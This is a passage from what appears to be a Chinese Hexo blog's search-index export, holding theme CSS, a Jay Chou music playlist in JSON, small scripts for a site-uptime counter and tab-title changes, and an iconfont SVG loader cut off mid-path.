        <content type="html"><![CDATA[/* @font-face {  font-family: Candyhome;  src: url(https://npm.elemecdn.com/anzhiyu-blog@1.1.6/fonts/Candyhome.ttf);  font-display: swap;  font-weight: lighter;} */@font-face {  font-family: ZhuZiAYuanJWD;  src: url(https://npm.elemecdn.com/anzhiyu-blog@1.1.6/fonts/ZhuZiAWan.woff2);  font-display: swap;  font-weight: lighter;}div#menus {  font-family: "ZhuZiAYuanJWD";}h1#site-title {  font-family: ZhuZiAYuanJWD;  font-size: 3em !important;}a.article-title,a.blog-slider__title,a.categoryBar-list-link,h1.post-title {  font-family: ZhuZiAYuanJWD;}.iconfont {  font-family: "iconfont" !important;  font-size: 3em;  /* 可以定义图标大小 */  font-style: normal;  -webkit-font-smoothing: antialiased;  -moz-osx-font-smoothing: grayscale;}/* 时间轴生肖icon */svg.icon {  /* 这里定义svg.icon，避免和Butterfly自带的note标签冲突 */  width: 1em;  height: 1em;  /* width和height定义图标的默认宽度和高度*/  vertical-align: -0.15em;  fill: currentColor;  overflow: hidden;}.icon-zhongbiao::before {  color: #f7c768;}/* bilibli番剧插件 */#article-container .bangumi-tab.bangumi-active {  background: var(--anzhiyu-theme);  color: var(--anzhiyu-ahoverbg);  border-radius: 10px;}a.bangumi-tab:hover {  text-decoration: none !important;}.bangumi-button:hover {  background: var(--anzhiyu-theme) !important;  border-radius: 10px !important;  color: var(--anzhiyu-ahoverbg) !important;}a.bangumi-button.bangumi-nextpage:hover {  text-decoration: none !important;}.bangumi-button {  padding: 5px 10px !important;}a.bangumi-tab {  padding: 5px 10px !important;}svg.icon.faa-tada {  font-size: 1.1em;}.bangumi-info-item {  border-right: 1px solid #f2b94b;}.bangumi-info-item span {  color: #f2b94b;}.bangumi-info-item em {  color: #f2b94b;}/* 解决artitalk的图标问题 */#uploadSource > svg {  width: 1.19em;  height: 1.5em;}/*top-img黑色透明玻璃效果移除，不建议加，除非你执着于完全一图流或者背景图对比色明显 */#page-header:not(.not-top-img):before {  background-color: transparent !important;}/* 首页文章卡片 */#recent-posts > .recent-post-item {  background: rgba(255, 255, 255, 0.9);}/* 首页侧栏卡片 */#aside-content .card-widget {  background: rgba(255, 255, 255, 0.9);}/* 文章页面正文背景 */div#post {  background: rgba(255, 255, 255, 0.9);}/* 分页页面 */div#page {  background: rgba(255, 255, 255, 0.9);}/* 归档页面 */div#archive {  background: rgba(255, 255, 255, 0.9);}/* 标签页面 */div#tag {  background: rgba(255, 255, 255, 0.9);}/* 分类页面 */div#category {  background: rgba(255, 255, 255, 0.9);}/*夜间模式伪类遮罩层透明*/[data-theme="dark"] #recent-posts > .recent-post-item {  background: #121212;}[data-theme="dark"] .card-widget {  background: #121212 !important;}[data-theme="dark"] div#post {  background: #121212 !important;}[data-theme="dark"] div#tag {  background: #121212 !important;}[data-theme="dark"] div#archive {  background: #121212 !important;}[data-theme="dark"] div#page {  background: #121212 !important;}[data-theme="dark"] div#category {  background: #121212 !important;}[data-theme="dark"] div#category {  background: transparent !important;}/* 页脚透明 */#footer {  background: transparent !important;}/* 头图透明 */#page-header {  background: transparent !important;}#rightside > div > button {  border-radius: 5px;}/* 滚动条 */::-webkit-scrollbar {  width: 10px;  height: 10px;}::-webkit-scrollbar-thumb {  background-color: #3b70fc;  border-radius: 2em;}::-webkit-scrollbar-corner {  background-color: transparent;}::-moz-selection {  color: #fff;  background-color: #3b70fc;}/* 音乐播放器 *//* .aplayer .aplayer-lrc {  display: none !important;} */.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {  left: -66px !important;  transition: all 0.3s;  /* 默认情况下缩进左侧66px，只留一点箭头部分 */}.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {  left: 0 !important;  transition: all 0.3s;  /* 鼠标悬停是左侧缩进归零，完全显示按钮 */}.aplayer.aplayer-fixed {  z-index: 999999 !important;}/* 评论框  */.vwrap {  box-shadow: 2px 2px 5px #bbb;  background: rgba(255, 255, 255, 0.3);  border-radius: 8px;  padding: 30px;  margin: 30px 0px 30px 0px;}/* 设置评论框 */.vcard {  box-shadow: 2px 2px 5px #bbb;  background: rgba(255, 255, 255, 0.3);  border-radius: 8px;  padding: 30px;  margin: 30px 0px 0px 0px;}/* md网站下划线 */#article-container a:hover {  text-decoration: none !important;}#article-container #hpp_talk p img {  display: inline;}/* 404页面 */#error-wrap {  position: absolute;  top: 40%;  right: 0;  left: 0;  margin: 0 auto;  padding: 0 1rem;  max-width: 1000px;  transform: translate(0, -50%);}#error-wrap .error-content {  display: flex;  flex-direction: row;  justify-content: center;  align-items: center;  margin: 0 1rem;  height: 18rem;  border-radius: 8px;  background: var(--card-bg);  box-shadow: var(--card-box-shadow);  transition: all 0.3s;}#error-wrap .error-content .error-img {  box-flex: 1;  flex: 1;  height: 100%;  border-top-left-radius: 8px;  border-bottom-left-radius: 8px;  background-color: #3b70fc;  background-position: center;  background-size: cover;}#error-wrap .error-content .error-info {  box-flex: 1;  flex: 1;  padding: 0.5rem;  text-align: center;  font-size: 14px;  font-family: Titillium Web, "PingFang SC", "Hiragino Sans GB", "Microsoft JhengHei", "Microsoft YaHei", sans-serif;}#error-wrap .error-content .error-info .error_title {  margin-top: -4rem;  font-size: 9em;}#error-wrap .error-content .error-info .error_subtitle {  margin-top: -3.5rem;  word-break: break-word;  font-size: 1.6em;}#error-wrap .error-content .error-info a {  display: inline-block;  margin-top: 0.5rem;  padding: 0.3rem 1.5rem;  background: var(--btn-bg);  color: var(--btn-color);}#body-wrap.error .aside-list {  display: flex;  flex-direction: row;  flex-wrap: nowrap;  bottom: 0px;  position: absolute;  padding: 1rem;  width: 100%;  overflow: scroll;}#body-wrap.error .aside-list .aside-list-group {  display: flex;  flex-direction: row;  flex-wrap: nowrap;  max-width: 1200px;  margin: 0 auto;}#body-wrap.error .aside-list .aside-list-item {  padding: 0.5rem;}#body-wrap.error .aside-list .aside-list-item img {  width: 100%;  object-fit: cover;  border-radius: 12px;}#body-wrap.error .aside-list .aside-list-item .thumbnail {  overflow: hidden;  width: 230px;  height: 143px;  background: var(--anzhiyu-card-bg);  display: flex;}#body-wrap.error .aside-list .aside-list-item .content .title {  -webkit-line-clamp: 2;  overflow: hidden;  display: -webkit-box;  -webkit-box-orient: vertical;  line-height: 1.5;  justify-content: center;  align-items: flex-end;  align-content: center;  padding-top: 0.5rem;  color: white;}#body-wrap.error .aside-list .aside-list-item .content time {  display: none;}/* 代码框主题 */#article-container figure.highlight {  border-radius: 10px;}]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/json/music.json"/>
      <url>/json/music.json</url>
      
        <content type="html"><![CDATA[[{"name":"青花瓷","artist":"周杰伦","url":"https://npm.elemecdn.com/anzhiyu-music@1.0.4/青花瓷/青花瓷.mp3","cover":"https://y.qq.com/music/photo_new/T002R300x300M000002eFUFm2XYZ7z_2.jpg?max_age=2592000","lrc":"https://npm.elemecdn.com/anzhiyu-music@1.0.4/青花瓷/青花瓷.lrc"},{"name":"稻香","artist":"周杰伦","url":"https://npm.elemecdn.com/anzhiyu-music@1.0.1/周杰伦/稻香/稻香.mp3","cover":"https://y.qq.com/music/photo_new/T002R300x300M000002Neh8l0uciQZ_1.jpg?max_age=2592000","lrc":"https://npm.elemecdn.com/anzhiyu-music@1.0.1/周杰伦/稻香/稻香.lrc"},{"name":"晴天","artist":"周杰伦","url":"https://npm.elemecdn.com/anzhiyu-music@1.0.2/晴天/晴天.mp3","cover":"https://y.qq.com/music/photo_new/T002R300x300M000000MkMni19ClKG_3.jpg?max_age=2592000","lrc":"https://npm.elemecdn.com/anzhiyu-music@1.0.2/晴天/晴天.lrc"},{"name":"七里香","artist":"周杰伦","url":"https://npm.elemecdn.com/anzhiyu-music@1.0.2/七里香/七里香.mp3","cover":"https://y.qq.com/music/photo_new/T002R300x300M000003DFRzD192KKD_1.jpg?max_age=2592000","lrc":"https://npm.elemecdn.com/anzhiyu-music@1.0.2/七里香/七里香.lrc"},{"name":"花海","artist":"周杰伦","url":"https://npm.elemecdn.com/anzhiyu-music-jay@1.0.1/花海/花海.flac","cover":"https://y.qq.com/music/photo_new/T002R300x300M000002Neh8l0uciQZ_1.jpg?max_age=2592000","lrc":"https://npm.elemecdn.com/anzhiyu-music-jay@1.0.1/花海/花海.lrc"},{"name":"反方向的钟","artist":"周杰伦","url":"https://npm.elemecdn.com/anzhiyu-music-jay@1.0.1/反方向的钟/反方向的钟.flac","cover":"https://y.qq.com/music/photo_new/T002R300x300M000000f01724fd7TH_1.jpg?max_age=2592000","lrc":"https://npm.elemecdn.com/anzhiyu-music-jay@1.0.1/反方向的钟/反方向的钟.lrc"},{"name":"兰亭序","artist":"周杰伦","url":"https://npm.elemecdn.com/anzhiyu-music@1.0.1/周杰伦/兰亭序/兰亭序.mp3","cover":"https://y.qq.com/music/photo_new/T002R300x300M000002Neh8l0uciQZ_1.jpg?max_age=2592000","lrc":"https://npm.elemecdn.com/anzhiyu-music@1.0.1/周杰伦/兰亭序/兰亭序.lrc"},{"name":"说好的辛福呢","artist":"周杰伦","url":"https://npm.elemecdn.com/anzhiyu-music@1.0.2/说好的辛福呢/说好的辛福呢.mp3","cover":"https://y.qq.com/music/photo_new/T002R300x300M000002Neh8l0uciQZ_1.jpg?max_age=2592000","lrc":"https://npm.elemecdn.com/anzhiyu-music@1.0.2/说好的辛福呢/说好的幸福呢.lrc"},{"name":"等你下课 (with 杨瑞代)","artist":"周杰伦","url":"https://npm.elemecdn.com/anzhiyu-music@1.0.1/周杰伦/等你下课/等你下课.mp3","cover":"https://y.qq.com/music/photo_new/T002R300x300M000003bSL0v4bpKAx_1.jpg?max_age=2592000","lrc":"https://npm.elemecdn.com/anzhiyu-music@1.0.1/周杰伦/等你下课/等你下课.lrc"},{"name":"我落泪情绪零碎","artist":"周杰伦","url":"https://npm.elemecdn.com/anzhiyu-music@1.0.2/我落泪情绪零碎/我落泪情绪零碎.mp3","cover":"https://y.qq.com/music/photo_new/T002R300x300M000000bviBl4FjTpO_1.jpg?max_age=2592000","lrc":"https://npm.elemecdn.com/anzhiyu-music@1.0.2/我落泪情绪零碎/我落泪情绪零碎.lrc"},{"name":"听妈妈的话","artist":"周杰伦","url":"https://npm.elemecdn.com/anzhiyu-music@1.0.2/听妈妈的话/听妈妈的话.mp3","cover":"https://y.qq.com/music/photo_new/T002R300x300M000002jLGWe16Tf1H_1.jpg?max_age=2592000","lrc":"https://npm.elemecdn.com/anzhiyu-music@1.0.2/听妈妈的话/听妈妈的话.lrc"},{"name":"明明就","artist":"周杰伦","url":"https://npm.elemecdn.com/anzhiyu-music-jay@1.0.1/明明就/明明就.flac","cover":"https://y.qq.com/music/photo_new/T002R300x300M000003Ow85E3pnoqi_1.jpg?max_age=2592000","lrc":"https://npm.elemecdn.com/anzhiyu-music-jay@1.0.1/明明就/明明就.lrc"},{"name":"我是如此相信","artist":"周杰伦","url":"https://npm.elemecdn.com/anzhiyu-music-jay@1.0.1/我是如此相信/我是如此相信.flac","cover":"https://y.qq.com/music/photo_new/T002R300x300M000001hGx1Z0so1YX_1.jpg?max_age=2592000","lrc":"https://npm.elemecdn.com/anzhiyu-music-jay@1.0.1/我是如此相信/我是如此相信.lrc"},{"name":"发如雪","artist":"周杰伦","url":"https://npm.elemecdn.com/anzhiyu-music@1.0.3/发如雪/发如雪.mp3","cover":"https://y.qq.com/music/photo_new/T002R300x300M0000024bjiL2aocxT_3.jpg?max_age=2592000","lrc":"https://npm.elemecdn.com/anzhiyu-music@1.0.3/发如雪/发如雪.lrc"},{"name":"以父之名","artist":"周杰伦","url":"https://npm.elemecdn.com/anzhiyu-music@1.0.3/以父之名/以父之名.mp3","cover":"https://y.qq.com/music/photo_new/T002R300x300M000000MkMni19ClKG_3.jpg?max_age=2592000","lrc":"https://npm.elemecdn.com/anzhiyu-music@1.0.3/以父之名/以父之名.lrc"},{"name":"园游会","artist":"周杰伦","url":"https://npm.elemecdn.com/anzhiyu-music@1.0.3/园游会/园游会.flac","cover":"https://y.qq.com/music/photo_new/T002R300x300M000003DFRzD192KKD_1.jpg?max_age=2592000","lrc":"https://npm.elemecdn.com/anzhiyu-music@1.0.3/园游会/园游会.lrc"},{"name":"本草纲目","artist":"周杰伦","url":"https://npm.elemecdn.com/anzhiyu-music@1.0.4/本草纲目/本草纲目.mp3","cover":"https://y.qq.com/music/photo_new/T002R300x300M000002jLGWe16Tf1H_1.jpg?max_age=2592000","lrc":"https://npm.elemecdn.com/anzhiyu-music@1.0.4/本草纲目/本草纲目.lrc"},{"name":"龙卷风","artist":"周杰伦","url":"https://npm.elemecdn.com/anzhiyu-music@1.0.4/龙卷风/龙卷风.mp3","cover":"https://y.qq.com/music/photo_new/T002R300x300M000000f01724fd7TH_1.jpg?max_age=2592000","lrc":"https://npm.elemecdn.com/anzhiyu-music@1.0.4/龙卷风/龙卷风.lrc"}]]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>分类</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>标签</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/js/runtime.js"/>
      <url>/js/runtime.js</url>
      
        <content type="html"><![CDATA[var now = new Date();function createtime() {  var grt = new Date("03/20/2024 00:00:00");  now.setTime(now.getTime() + 250);  var days = (now - grt) / 1e3 / 60 / 60 / 24,    dnum = Math.floor(days),    hours = (now - grt) / 1e3 / 60 / 60 - 24 * dnum,    hnum = Math.floor(hours);  1 == String(hnum).length && (hnum = "0" + hnum);  var minutes = (now - grt) / 1e3 / 60 - 1440 * dnum - 60 * hnum,    mnum = Math.floor(minutes);  1 == String(mnum).length && (mnum = "0" + mnum);  var seconds = (now - grt) / 1e3 - 86400 * dnum - 3600 * hnum - 60 * mnum,    snum = Math.round(seconds);  1 == String(snum).length && (snum = "0" + snum);  let currentTimeHtml = "";  (currentTimeHtml =    hnum < 18 && hnum >= 9      ? `本站居然运行了 ${dnum} 天</span><span id='runtime'> ${hnum} 小时 ${mnum} 分 ${snum} 秒 </span> <i class='fas fa-heartbeat' style='color:red'></i>`      : `本站居然运行了 ${dnum} 天</span><span id='runtime'> ${hnum} 小时 ${mnum} 分 ${snum} 秒 </span> <i class='fas fa-heartbeat' style='color:red'></i>`),    document.getElementById("workboard") && (document.getElementById("workboard").innerHTML = currentTimeHtml);}setInterval(() => {  createtime();}, 250);]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>音乐馆</title>
      <link href="/music/index.html"/>
      <url>/music/index.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/js/title.js"/>
      <url>/js/title.js</url>
      
        <content type="html"><![CDATA[//动态标题var OriginTitile = document.title;var titleTime;document.addEventListener("visibilitychange", function () {  if (document.hidden) {    //离开当前页面时标签显示内容    document.title = "w(ﾟДﾟ)w 不要走！再看看嘛！";    clearTimeout(titleTime);  } else {    //返回当前页面时标签显示内容    document.title = "♪(^∇^*)欢迎肥来！" + OriginTitile;    //两秒后变回正常标题    titleTime = setTimeout(function () {      document.title = OriginTitile;    }, 2000);  }});]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/js/ali_font.js"/>
      <url>/js/ali_font.js</url>
      
        <content type="html"><![CDATA[!(function (c) {  var l,    h,    a,    t,    i,    v =      '<svg><symbol id="icon-dragon_chen" viewBox="0 0 1024 1024"><path d="M512 512m-296.421053 0a296.421053 296.421053 0 1 0 592.842106 0 296.421053 296.421053 0 1 0-592.842106 0Z" fill="#D6B196" ></path><path d="M970.105263 512c0 224.983579-163.166316 412.186947-377.263158 450.533053v-54.460632C777.135158 870.507789 916.210526 707.206737 916.210526 512c0-222.881684-181.328842-404.210526-404.210526-404.210526S107.789474 289.118316 107.789474 512s181.328842 404.210526 404.210526 404.210526c9.081263 0 18.000842-0.754526 26.947368-1.374315v53.894736c-8.973474 0.538947-17.866105 1.374316-26.947368 1.374316-252.604632 0-458.105263-205.500632-458.105263-458.105263S259.395368 53.894737 512 53.894737s458.105263 205.500632 458.105263 458.105263z m-498.122105 265.620211L431.157895 754.526316V485.052632h-66.074948c-14.470737 110.645895-44.355368 197.066105-102.696421 260.742736l-39.747368-36.432842C306.526316 617.876211 323.368421 462.901895 323.368421 242.526316V215.578947h377.263158v53.894737H377.182316c-0.404211 58.260211-2.209684 112.128-6.359579 161.684211H700.631579v53.894737h-122.152421a481.172211 481.172211 0 0 0 76.826947 119.70021l66.479158-39.855158 27.728842 46.214737-54.460631 32.687158c29.507368 24.953263 63.757474 45.675789 102.80421 58.098526l-16.303158 51.361684c-134.224842-42.711579-222.773895-167.073684-261.551158-268.207157H485.052632v221.857684l68.985263-41.391158 27.728842 46.214737-109.783579 65.886316zM646.736842 377.263158h-215.578947v-53.894737h215.578947v53.894737z" fill="#231F20" ></path></symbol><symbol id="icon-dog_xu" viewBox="0 0 1024 1024"><path d="M512 512m-296.421053 0a296.421053 296.421053 0 1 0 592.842106 0 296.421053 296.421053 0 1 0-592.842106 0Z" fill="#D6B196" ></path><path d="M970.105263 512c0 224.983579-163.166316 412.186947-377.263158 450.533053v-54.460632C777.135158 870.507789 916.210526 707.206737 916.210526 512c0-222.881684-181.328842-404.210526-404.210526-404.210526S107.789474 289.118316 107.789474 512s181.328842 404.210526 404.210526 404.210526c9.081263 0 18.000842-0.754526 26.947368-1.374315v53.894736c-8.973474 0.538947-17.866105 1.374316-26.947368 1.374316-252.604632 0-458.105263-205.500632-458.105263-458.105263S259.395368 53.894737 512 53.894737s458.105263 205.500632 458.105263 458.105263z m-375.592421 150.393263c33.684211 44.544 75.210105 74.698105 124.739369 90.812632l11.425684 3.718737 10.401684-6.009264C781.204211 727.740632 808.421053 622.565053 808.421053 592.842105h-53.894737c0 22.069895-19.132632 80.869053-33.711158 103.504842-34.816-14.605474-64.538947-39.262316-89.249684-74.13221 48.316632-55.269053 92.079158-117.328842 120.535579-179.900632l-49.044211-22.285473c-23.767579 52.250947-59.742316 104.717474-100.055579 152.656842-24.010105-50.930526-41.148632-115.927579-51.658105-195.395369H700.631579v-53.894737h-155.189895A1848.050526 1848.050526 0 0 1 538.947368 161.684211h-53.894736c0 58.206316 2.155789 112.074105 6.494315 161.68421H323.368421v26.947368c0 216.549053-13.177263 263.545263-100.702316 359.046737l39.747369 36.432842c63.326316-69.093053 92.806737-118.272 105.714526-206.848H485.052632v-53.894736h-111.319579a1742.147368 1742.147368 0 0 0 3.449263-107.789474h120.158316c12.611368 98.250105 35.031579 177.475368 67.395368 238.187789-61.978947 65.536-128.053895 117.975579-173.298526 142.282106l25.519158 47.481263c47.589053-25.573053 114.095158-77.446737 177.55621-142.821053z m125.170526-411.971368l-80.842105-80.842106-38.103579 38.103579 80.842105 80.842106 38.103579-38.103579z" fill="#231F20" ></path></symbol><symbol id="icon-dog" viewBox="0 0 1024 1024"><path d="M894.814316 904.434526l83.240421-183.134315-13.824-13.204211c-0.485053-0.458105-45.648842-47.589053-47.939369-185.263158-0.134737-7.922526-0.134737-33.953684-0.134736-55.996631-30.693053 15.306105-70.090105 19.887158-106.09179 19.887157-92.752842 0-163.624421-23.983158-210.647579-71.275789a192.512 192.512 0 0 1-27.944421-36.513684H377.263158v377.263158c342.662737 0 403.105684 51.092211 494.592 128.377263 7.922526 6.682947 15.521684 13.312 22.959158 19.86021z" fill="#85C3DE" ></path><path d="M326.063158 282.947368c0 34.250105-13.231158 44.463158-29.642105 44.463158s-29.642105-10.213053-29.642106-44.463158c0-34.223158 13.231158-44.463158 29.642106-44.463157s29.642105 10.24 29.642105 44.463157zM269.473684 430.295579v311.646316L190.275368 916.210526h59.203369L323.368421 753.637053V377.263158h-26.947368c-119.403789 0-172.732632-53.382737-185.505685-107.789474h35.624421c51.092211 0 68.581053-15.764211 120.535579-62.544842 12.773053-11.506526 28.079158-25.276632 47.023158-41.741474l18.351158-15.952842-69.658947-99.139368-44.085895 30.989474 41.768421 59.472842c-11.183158 9.862737-20.884211 18.593684-29.480421 26.327579C180.736 212.156632 176.235789 215.578947 146.539789 215.578947H53.894737v26.947369c0 88.710737 66.910316 178.149053 215.578947 187.769263z m216.710737-161.414737c2.290526 71.733895 28.698947 136.326737 75.048421 182.918737C618.711579 509.628632 702.437053 538.947368 810.091789 538.947368c18.593684 0 36.190316-1.158737 52.628211-3.449263 3.745684 111.265684 33.630316 170.334316 51.496421 196.015158l-38.507789 84.722526C782.174316 742.049684 688.774737 700.631579 377.263158 700.631579v53.894737c34.277053 0 65.697684 0.512 94.639158 1.509052L374.595368 970.105263h59.203369l96.013474-211.240421c66.182737 4.338526 117.005474 11.829895 157.911578 22.016L626.229895 916.210526h59.176421l54.16421-119.134315c47.616 18.405053 79.737263 42.091789 113.125053 69.739789L805.753263 970.105263h59.203369l113.071157-248.778105-13.824-13.204211c-0.485053-0.458105-45.648842-47.589053-47.939368-185.263158C985.168842 498.553263 1024 447.811368 1024 377.263158c0-95.205053-66.506105-161.684211-161.684211-161.684211v53.894737c65.482105 0 107.789474 42.307368 107.789474 107.789474 0 89.088-87.013053 107.789474-160.013474 107.789474-92.752842 0-163.624421-23.983158-210.647578-71.27579-30.315789-30.504421-45.891368-65.832421-53.35579-98.735158 11.210105 6.952421 22.932211 13.338947 35.274105 19.186527l23.04-48.720843c-92.106105-43.654737-148.992-128.646737-219.243789-243.981473l-46.026105 28.05221c49.448421 81.246316 92.968421 148.506947 147.051789 199.302737z" fill="#231F20" ></path></symbol><symbol id="icon-goat" viewBox="0 0 1024 1024"><path d="M548.378947 646.736842a952.32 952.32 0 0 1 140.90779-161.68421H107.789474c0 107.600842 0 107.600842-63.649685 169.283368l-13.069473 12.665263L66.721684 754.526316h417.172211c20.345263-41.472 43.654737-77.446737 64.485052-107.789474z" fill="#F7C768" ></path><path d="M608.256 144.734316C555.762526 115.577263 506.098526 107.789474 485.052632 107.789474V53.894737c32.579368 0 91.270737 11.452632 149.369263 43.735579 75.290947 41.822316 130.694737 94.531368 171.385263 150.878316C755.873684 288.013474 697.101474 323.368421 646.736842 323.368421h-107.789474v-53.894737h107.789474c20.506947 0 48.424421-11.210105 80.437895-31.285895a471.04 471.04 0 0 0-118.918737-93.453473zM832.673684 342.231579c-16.384 0-29.642105 10.24-29.642105 44.463158 0 34.250105 13.231158 44.463158 29.642105 44.463158s29.642105-10.213053 29.642105-44.463158c0-34.223158-13.231158-44.463158-29.642105-44.463158zM1024 619.789474C1024 347.109053 901.066105 122.448842 686.753684 3.395368l-26.165895 47.104C914.324211 191.461053 964.688842 440.400842 969.647158 592.842105h-84.506947c-17.92-35.624421-45.352421-69.12-87.013053-101.995789l-16.788211-13.285053-16.734315 13.392842c-66.128842 52.897684-134.629053 127.083789-187.311158 209.677474H102.965895l-8.272842-20.318316C159.043368 617.013895 161.684211 603.109053 161.684211 485.052632v-53.894737h485.052631v-53.894737H161.684211c0-80.384 14.309053-110.026105 66.586947-137.916632l-25.384421-47.535158C123.365053 234.226526 107.789474 291.920842 107.789474 377.263158v107.789474c0 107.600842 0 107.600842-63.649685 169.283368l-13.069473 12.665263L110.618947 862.315789h58.206316l-43.897263-107.789473h103.477895l43.897263 107.789473h58.206316l-43.897263-107.789473h259.47621C508.981895 824.939789 485.052632 899.152842 485.052632 970.105263h53.894736c0-68.688842 27.270737-144.060632 68.958316-215.578947H687.157895c7.410526 0 13.473684 6.063158 13.473684 13.473684V862.315789h53.894737v-94.315789c0-37.160421-30.208-67.368421-67.368421-67.368421h-44.65179c40.771368-58.017684 89.438316-111.427368 138.913684-153.626947C841.512421 600.037053 862.315789 655.225263 862.315789 754.526316h53.894737c0-38.912-2.748632-74.482526-11.102315-107.789474H1024v-26.947368z" fill="#231F20" ></path></symbol><symbol id="icon-goat_wei" viewBox="0 0 1024 1024"><path d="M512 512m-296.421053 0a296.421053 296.421053 0 1 0 592.842106 0 296.421053 296.421053 0 1 0-592.842106 0Z" fill="#D6B196" ></path><path d="M970.105263 512c0 224.983579-163.166316 412.186947-377.263158 450.533053v-54.460632C777.135158 870.507789 916.210526 707.206737 916.210526 512c0-222.881684-181.328842-404.210526-404.210526-404.210526S107.789474 289.118316 107.789474 512s181.328842 404.210526 404.210526 404.210526c9.081263 0 18.000842-0.754526 26.947368-1.374315v53.894736c-8.973474 0.538947-17.866105 1.374316-26.947368 1.374316-252.604632 0-458.105263-205.500632-458.105263-458.105263S259.395368 53.894737 512 53.894737s458.105263 205.500632 458.105263 458.105263z m-431.157895 50.202947c52.304842 70.925474 136.973474 152.144842 232.528843 190.383158l19.994947-50.041263c-109.271579-43.708632-202.805895-152.629895-238.780632-217.49221H808.421053v-53.894737H538.947368v-53.894737h215.578948v-53.894737h-215.578948V161.684211h-53.894736v161.68421h-215.578948v53.894737h215.578948v53.894737H215.578947v53.894737h255.757474c-35.974737 64.862316-129.536 173.783579-238.807579 217.49221l20.021895 50.041263c95.528421-38.238316 180.197053-119.484632 232.501895-190.383158V808.421053h53.894736v-246.218106z" fill="#231F20" ></path></symbol><symbol id="icon-dragon" viewBox="0 0 1024 1024"><path d="M366.376421 344.441263l152.980211-152.98021c43.142737-43.142737 141.204211-9.216 270.201263 115.738947-15.225263 9.835789-25.114947 15.818105-44.13979 32.256s-38.076632 35.489684-59.418947 56.832c-4.203789 4.203789-51.173053 53.221053-78.740211 82.027789-10.805895-12.126316-22.743579-24.171789-34.654315-36.082526L493.136842 362.792421l-54.218105 54.218105-72.542316-72.569263zM862.315789 512c0 46.834526-45.352421 80.842105-107.789473 80.842105-108.948211 0-189.359158-28.806737-267.129263-56.697263C414.100211 509.871158 344.872421 485.052632 258.182737 485.052632 80.788211 485.052632 0 588.126316 0 683.897263h53.894737C73.216 659.779368 135.302737 646.736842 177.340632 646.736842c77.338947 0 223.124211 23.282526 291.893894 47.912421C547.462737 722.701474 615.989895 754.526316 734.315789 754.526316 862.315789 754.526316 916.210526 670.315789 916.210526 512h-53.894737z" fill="#FF8787" ></path><path d="M552.421053 1024c-69.766737 0-113.825684-13.958737-156.402527-27.459368-54.487579-17.273263-110.807579-35.004632-232.421052-26.516211l-3.826527-53.733053c131.718737-9.458526 195.934316 10.967579 252.52379 28.887579 42.226526 13.365895 78.686316 24.926316 140.126316 24.926316 92.752842 0 148.210526-57.936842 148.210526-113.960421 0-16.949895-5.524211-101.618526-114.634105-101.618526-64.970105 0-112.747789 23.336421-163.328 48.02021C365.325474 830.571789 300.301474 862.315789 204.288 862.315789 85.908211 862.315789 0 787.294316 0 683.897263 0 588.126316 80.788211 485.052632 258.182737 485.052632c86.689684 0 155.917474 24.818526 229.214316 51.09221 45.810526 16.410947 92.564211 33.172211 145.488842 44.166737 9.000421-7.033263 13.850947-16.276211 13.850947-26.758737 0-37.187368-37.672421-74.859789-74.13221-111.265684l-3.287579-3.287579 38.103579-38.103579 3.260631 3.287579C652.853895 446.275368 700.631579 494.026105 700.631579 553.552842c0 12.719158-2.802526 24.926316-7.976421 36.109474A594.997895 594.997895 0 0 0 754.526316 592.842105c62.437053 0 107.789474-34.007579 107.789473-80.842105 0-58.853053-52.870737-110.268632-108.840421-164.702316l-8.057263-7.841684c-19.024842 16.437895-38.076632 35.489684-59.418947 56.832l-38.103579-38.103579c74.805895-74.832842 134.898526-134.898526 268.314947-141.931789V55.619368c-63.407158 7.787789-120.993684 39.424-121.667368 39.801264l-15.818105 8.811789-14.120421-11.344842C731.701895 66.452211 709.712842 53.894737 673.684211 53.894737c-41.418105 0-74.347789 25.869474-109.190737 53.301895-26.624 20.911158-54.137263 42.549895-86.851369 53.194105L469.342316 161.684211h-69.093053l-105.525895 105.525894-38.103579-38.130526L324.015158 161.684211H161.684211V107.789474h303.104c22.231579-8.272842 43.708632-25.168842 66.398315-42.981053C569.829053 34.438737 613.618526 0 673.684211 0c48.909474 0 81.408 17.946947 110.888421 40.097684C813.702737 26.300632 877.729684 0 943.157895 0h26.947368v323.368421h-53.894737v-53.167158c-54.164211 3.098947-92.914526 15.845053-127.002947 36.675369l1.832421 1.778526C852.587789 368.505263 916.210526 430.376421 916.210526 512c0 60.928-43.708632 109.945263-107.789473 127.622737V700.631579h53.894736v-53.894737h53.894737v53.894737h53.894737v53.894737h-53.894737v53.894737h-53.894737v-53.894737h-53.894736c-29.722947 0-53.894737-24.171789-53.894737-53.894737v-53.894737c-118.325895 0-207.063579-31.797895-285.318737-59.877053C400.437895 562.229895 335.494737 538.947368 258.182737 538.947368 117.059368 538.947368 53.894737 611.732211 53.894737 683.897263 53.894737 757.221053 115.738947 808.421053 204.288 808.421053c11.910737 0 23.228632-0.538947 34.034526-1.536C248.454737 796.321684 269.473684 770.640842 269.473684 739.166316c0-33.118316-43.088842-70.979368-58.152421-81.596632l30.935579-44.139789c8.299789 5.793684 81.111579 58.664421 81.111579 125.736421 0 19.429053-4.527158 37.052632-10.994526 52.304842 30.773895-10.051368 58.314105-23.498105 86.662737-37.349053C452.877474 727.848421 508.577684 700.631579 585.997474 700.631579 702.410105 700.631579 754.526316 778.725053 754.526316 856.144842 754.526316 938.657684 678.912 1024 552.421053 1024z 